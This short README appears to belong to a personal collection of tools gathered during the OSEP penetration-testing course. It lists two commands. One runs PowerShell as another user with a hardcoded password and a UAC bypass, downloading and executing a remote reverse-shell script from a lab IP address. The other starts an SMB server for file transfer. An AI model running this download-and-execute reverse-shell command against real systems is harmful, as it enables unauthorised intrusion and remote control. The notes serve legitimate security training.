Just a bunch of tools built/gathered along the OSEP course.

## <ins>Useful Commands</ins>:

Run command as another user:
- `Invoke-RunasCs amit 'Password123!' 'powershell iex(iwr http://192.168.45.185/rev.txt -usebasicparsing)' -ForceProfile -CreateProcessFunction 2 -BypassUac`

Set up SMB serevr (file transfer):
- `smbserver.py share $(pwd) -smb2support -username amit -password password`
